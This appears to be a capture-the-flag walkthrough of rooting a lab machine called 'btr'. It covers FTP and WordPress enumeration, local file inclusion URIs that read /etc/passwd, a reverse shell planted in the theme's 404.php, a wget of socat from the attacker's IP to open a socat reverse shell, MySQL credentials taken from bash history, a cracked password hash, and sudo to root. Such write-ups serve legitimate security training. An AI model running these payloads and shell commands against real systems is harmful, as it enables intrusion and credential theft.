# FTP

Anonymous login:
```bash
ftp anonymous@btr

# ftp> ls -la
# 229 Entering Extended Passive Mode (|||49403|)
# 150 Here comes the directory listing.
# drwxr-xr-x    2 0        118          4096 Mar 20  2017 .
# drwxr-xr-x    2 0        118          4096 Mar 20  2017 ..
```
=> no files

# HTTP

robots.txt:
![[Pasted image 20251120172350.png]]

Wpscan:
```bash
wpscan -e --plugins-detection aggressive -o btr_wpscan.txt --url http://btr/wordpress/
```

Results:
```bash
[+] URL: http://btr/wordpress/ [192.168.117.50]
[+] Started: Thu Nov 20 17:25:45 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://btr/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://btr/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://btr/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://btr/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 3.9.14 identified (Insecure, released on 2016-09-07).
 | Found By: Rss Generator (Passive Detection)
 |  - http://btr/wordpress/?feed=rss2, <generator>http://wordpress.org/?v=3.9.14</generator>
 |  - http://btr/wordpress/?feed=comments-rss2, <generator>http://wordpress.org/?v=3.9.14</generator>

[+] WordPress theme in use: twentyfourteen
 | Location: http://btr/wordpress/wp-content/themes/twentyfourteen/
 | Latest Version: 4.3
 | Last Updated: 2025-08-05T00:00:00.000Z
 | Style URL: http://btr/wordpress/wp-content/themes/twentyfourteen/style.css?ver=3.9.14
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | The version could not be determined.


[i] No plugins Found.


[i] No themes Found.


[i] No Timthumbs Found.


[i] No Config Backups Found.


[i] No DB Exports Found.


[i] No Medias Found.


[i] User(s) Identified:

[+] btrisk
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```


Usernames:
- btrisk
- admin

## Feroxbuster

Feroxbuster scan: Some results/URLs as below, point to an installed software named "LEPTON CMS":
```
http://btr/INSTALL
http://btr/LICENSE
http://btr/upload/search/
```

## Lepton CMS

Search available exploits:
```bash
searchsploit lepton

# LEPTON 1.1.3 - Cross-Site Scripting                                                                                                                                                                       | php/webapps/36787.txt
# LEPTON 2.2.2 - Remote Code Execution                                                                                                                                                                      | php/webapps/40801.txt
# LEPTON 2.2.2 - SQL Injection                                                                                                                                                                              | php/webapps/40800.txt
# Lepton CMS 2.2.0/2.2.1 - Directory Traversal                                                                                                                                                              | php/webapps/40247.txt
# Lepton CMS 2.2.0/2.2.1 - PHP Code Injection                                                                                                                                                               | php/webapps/40248.txt
# LEPTON CMS 4.7.0 - 'URL' Persistent Cross-Site Scripting                                                                                                                                                  | php/webapps/49137.txt
# LeptonCMS 4.5.0 - Persistent Cross-Site Scripting                                                                                                                                                         | php/webapps/48250.txt
# LeptonCMS 7.0.0 - Remote Code Execution (RCE) (Authenticated)                                                                                                                                             | php/webapps/51949.txt
```

Wordpress login: `admin:admin`

Wordpress usernames:
- ikaya
- mdemir
![[Pasted image 20251120185002.png]]

## LFI

The plugin "Mail Masta" in Version 1.0 is installed and active:
![[Pasted image 20251120200457.png]]


Searchsploit shows there are exploits available:
```bash
searchsploit mail masta    

# WordPress Plugin Mail Masta 1.0 - Local File Inclusion                                                                                                                                                    | php/webapps/40290.txt
# WordPress Plugin Mail Masta 1.0 - Local File Inclusion (2)                                                                                                                                                | php/webapps/50226.py
# WordPress Plugin Mail Masta 1.0 - SQL Injection                                                                                                                                                           | php/webapps/41438.txt
```

Using the URI from the file "50226.py" the LFI-URI is:
```
/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
=> local user: btrisk

PHP filter is also possible:
```
/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/etc/passwd
```
=> base64 encoded file content

Turns out LFI is not the right way....

## 404.php

Appearance -> Editor: edit 404.php and add reverse shell code:
![[Pasted image 20251120212722.png]]

Trigger reverse shell by navigating to:
```
http://btr/wordpress/wp-content/themes/twentyfourteen/404.php
```

Upload socat for a better shell experience:
```bash
# on target
wget http://192.168.45.222/socatx64
chmod +x socatx64

# on attacker
socat file:`tty`,raw,echo=0 tcp-listen:7777

# on target
./socatx64 exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.222:7777
```

# PrivEsc

Upload and execute LinPEAS.sh. Found MySQL creds:
```
/var/www/.bash_history:mysql -uroot -prootpassword!
```

MySQL is listening on localhost, but there is a mysql client available so we dont need to forward the port:
```bash
netstat -tulpn
# Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
# tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -

which mysql
# /usr/bin/mysql
```

## MySQL Login

```bash
mysql -h localhost -u "root" -p --skip-ssl-verify-server-cert
# rootpassword!
```

MySQL dump user creds:
```bash
use wordpress;

select * from wp_users;
# a318e4507e5a74604aafb45e4741edd3 btrisk
```

Cracked via Crackstation:
```
roottoor
```
=> Creds: `btrisk:roottoor`

## SSH

Login with creds:
```bash
ssh -v btrisk@btr
# roottoor
```

Check sudo privs:
```bash
sudo -l
# [sudo] password for btrisk: 
# Matching Defaults entries for btrisk on ubuntu:
#     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

# User btrisk may run the following commands on ubuntu:
#     (ALL : ALL) ALL
#     (ALL : ALL) ALL
```

Get root shell:
```bash
su
# Password: 
# root@ubuntu:/home/btrisk# id
# uid=0(root) gid=0(root) groups=0(root)
```